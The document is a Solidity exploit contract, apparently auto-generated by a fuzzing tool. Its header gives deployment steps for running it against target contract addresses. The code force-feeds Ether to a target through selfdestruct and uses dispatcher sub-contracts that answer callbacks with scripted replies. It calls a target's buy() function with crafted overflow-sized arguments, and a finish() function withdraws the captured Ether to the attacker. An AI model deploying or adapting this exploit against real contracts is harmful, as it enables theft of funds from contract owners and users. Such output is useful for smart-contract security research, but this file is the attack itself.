/*
 * Multi-Attacker Exploit Generated by EF/CF Attack Contract Synthesizer
 *
 * Deploy the `Attack` contract with the target addresses as the constructor
 * parameter. Make sure to send at least 0 ether and 1 wei to the attack
 * contract along with the constructor. Make sure that the ordering of the
 * target addresses array is exactly the same as in the fuzzer. Otherwise the
 * attack will not work!
 *
 * To execute the attack, call the `attack()` method. Calling `attack` might
 * emit the `WaitForBlocks(N)` event. In this case you should call the
 * `attack()` method again after `N` blocks have passed.
 *
 * To start the attack again, you can use `reset(new_target_addrs)` to reset the
 * attack contract.
 *
 * To claim the Ether gained with the attack, issue a call to `finish()`, which
 * will destroy all attack contracts and send all funds back to you.
 *
 * The original test case was executed with the following environment:
 * block number: +0
 * timestamp: +0
 * gas limit: 0
 * difficulty: 0
 * initial balance: 0x1 wei
 *
 */

pragma solidity ^0.7;

/*****************************************************/
contract ForceSender {
    function send(address payable target) external payable {
        selfdestruct(target);
    }
    receive() external payable {}
}

/*****************************************************/

interface AttackManager {
    function __get_state() external view returns(uint);
    function __get_rstate() external view returns(uint, uint);
    function __set_state(uint _state) external;
    function __set_rstate(uint _state, uint _rstate) external;
    function __id_to_address(uint id) external view returns(address payable);
}

contract AttackDispatcher {

    event CallReturned(uint state, address target, address who, bool success, bytes retdata);
    event InvalidDispatch(uint state, address who, address caller);
    event CallbackReceived(uint state, address who, address caller, uint value, bytes data);
    event Calling(uint state, address target, address from, uint value, bytes data);
    event Returning(uint state, uint rstate, address target, address from, bool success, bytes data);
    event ReturningNone(uint state, uint rstate, address target, address from);

    uint id;
    address payable[] targets;
    AttackManager manager;

    constructor(uint _id, address payable[] memory _targets) payable {
        id = _id;
        manager = AttackManager(msg.sender);
        targets = _targets;
    }

    fallback() external payable {
        _fallback();
    }
    receive() external payable {
        _fallback();
    }

    function _finish() external {
        address to = address(manager);
        require(msg.sender == to);
        selfdestruct(payable(to));
    }

    function _fallback() internal {
        (uint rstate_state, uint rstate) = manager.__get_rstate();
        emit CallbackReceived(rstate_state, address(this), msg.sender, msg.value, msg.data);
        if (rstate_state == 0) {
            if (rstate == 0) {
                uint cur_state = rstate_state;
                bytes memory retdata = bytes(hex"0000000000000000000000000000000000000000000000000000000000000000");
                uint retdata_len = 32;
                emit Returning(cur_state, rstate, msg.sender, address(this), true, retdata);
                rstate += 1;
                manager.__set_rstate(cur_state, rstate);
                assembly { return(retdata, retdata_len) }
            }
            else if (rstate == 1) {
                uint cur_state = rstate_state;
                bytes memory retdata = bytes(hex"0000000000000000000000000000000000000000000000000000000000000000");
                uint retdata_len = 32;
                emit Returning(cur_state, rstate, msg.sender, address(this), true, retdata);
                rstate += 1;
                manager.__set_rstate(cur_state, rstate);
                assembly { return(retdata, retdata_len) }
            }
            else if (rstate == 2) {
                uint cur_state = rstate_state;
                bytes memory retdata = bytes("");
                uint retdata_len = 0;
                emit Returning(cur_state, rstate, msg.sender, address(this), true, retdata);
                rstate += 1;
                manager.__set_rstate(cur_state, rstate);
                assembly { return(retdata, retdata_len) }
            }
            else if (rstate == 3) {
                uint cur_state = rstate_state;
                bytes memory retdata = bytes("");
                uint retdata_len = 0;
                emit Returning(cur_state, rstate, msg.sender, address(this), true, retdata);
                rstate += 1;
                manager.__set_rstate(cur_state, rstate);
                assembly { return(retdata, retdata_len) }
            }
        }

        emit ReturningNone(rstate_state, rstate, msg.sender, address(this));
    }

    function _dispatch() public returns(bool) {
        uint state = manager.__get_state();
        if (state == 0) {
            if (id == 0) {
                /*  func: buy(address,uint256,address,address[],bytes,uint256[],uint256[]) (0xb13bb160)
                input: { address(0xc04689c0c5d48cec7275152b3026b53f6f78d03d), uint(115792089237316195423570985008687907853269984665640564039457584007913129639708), address(0xcc079239d48f83be71dbbd18487f4acc279ee929), array[0](), bytes[80](0x3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c), array[1](uint(115792089237316195423570985008687907853269984665640564039457584007913129639935), ), array[0](),  }
 
                 */
                bytes memory data = abi.encodePacked(hex"b13bb160000000000000000000000000", (manager.__id_to_address(0)), hex"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1c000000000000000000000000", (manager.__id_to_address(6)));
                uint value = 0x0;
                address payable target = payable(targets[0 % targets.length]);
                emit Calling(state, target, address(this), value, data);
                (bool success, bytes memory retdata) = target.call{ value: value }(data);
                emit CallReturned(state, target, address(this), success, retdata);
                state += 1;
                manager.__set_state(state);
                return true;
            } else {
                AttackDispatcher via = AttackDispatcher(manager.__id_to_address(0));
                via._dispatch();
            }
        }
        emit InvalidDispatch(state, address(this), msg.sender);
        return false;
    }
}

contract Attack is AttackManager {

    event WaitForBlocks(uint count);
    event StateReached(uint state);
    event AttackFinished();

    uint constant REQUIRED_BUDGET = 0x1; /* equals 0 ether and 1 wei */
    uint constant INITIAL_ETHER = 0x1;

    uint state = 0;
    uint rstate_state = 0;
    mapping(uint => uint) rstate;
    uint budget = 0;

    address payable owner;
    address payable[] targets;

    mapping (uint => uint) state2sub;
    mapping (uint => uint) state2blockadvance;

    AttackDispatcher[7] subs;

    function setTargets(address payable[] memory _targets) internal {
        delete targets;
        require(_targets.length > 0);
        for (uint i = 0; i < _targets.length; i++) {
            require(_targets[i] != address(0));
            targets.push(_targets[i]);
        }
    }

    constructor(address payable[] memory _targets) payable {
        owner = payable(msg.sender);
        reset(_targets);
        state2sub[0] = 1 + 0;
    }

    modifier onlyOwner {
        require(owner != address(0));
        require(msg.sender == owner);
        _;
    }

    function __get_state() public view override returns(uint) {
        return state;
    }
    function __set_state(uint _state) public override {
        state = _state;
    }
    function __get_rstate() public view override returns(uint, uint) {
        return (rstate_state, rstate[rstate_state]);
    }
    function __set_rstate(uint _state, uint _rstate) public override {
        rstate[_state] = _rstate;
    }
    function __id_to_address(uint id) public view override returns(address payable) {
        return payable(address(subs[id % 7]));
    }

    receive() external payable {
        budget += msg.value;
    }

    function _reclaim_subs() internal {
        // delete prior attack subs, extracting funds
        for (uint i = 0; i < 7; i++) {
            if (address(subs[i]) != address(0)) {
                subs[i]._finish();
            }
        }
    }

    function reset(address payable[] memory _targets) public onlyOwner payable {
        _reclaim_subs();

        setTargets(_targets);

        // check budget
        budget = address(this).balance;
        require(budget >= REQUIRED_BUDGET);

        // reset state and sub contracts
        state = 0;
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 0 }(0, _targets);
    }

    function finish() external onlyOwner {
        _reclaim_subs();
        selfdestruct(owner);
    }
    
    function finishTo(address payable to) external onlyOwner {
        _reclaim_subs();
        selfdestruct(to);
    }

    function attack() external onlyOwner payable {
        if (state == 0) {
            ForceSender f = new ForceSender();
            f.send{value: INITIAL_ETHER}(targets[0]);
        }

        while (state < 1) {
            uint sub_id = state2sub[state];
            if (sub_id == 0) { // no sub available for the given state id
                break;
            }
            rstate_state = state;
            emit StateReached(state);
            sub_id -= 1;
            subs[sub_id]._dispatch();

            uint ba = state2blockadvance[state];
            if (ba > 0) {
                emit WaitForBlocks(ba);
                return;
            }
        }

        emit AttackFinished();
    }
}